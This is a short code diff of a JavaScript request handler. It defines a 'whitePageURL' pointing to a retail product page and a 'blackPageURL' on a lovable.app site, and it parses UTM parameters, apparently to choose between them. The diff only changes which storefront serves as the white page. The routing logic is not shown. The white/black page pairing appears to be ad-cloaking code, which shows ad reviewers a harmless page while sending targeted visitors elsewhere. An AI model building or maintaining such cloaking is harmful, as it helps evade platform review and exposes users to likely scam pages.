@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://en.bensimon.com/p/manteau-malik-64041.html?countryCode=pk&gl_language=en-EN&glCountry=PK&glCurrency=PKR&lang=en";
+    const whitePageURL = "https://www.shoppiccoliandco.com/collections/fw-24-25/products/paulina-pink-romper";
     const blackPageURL = "https://luvcshap.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
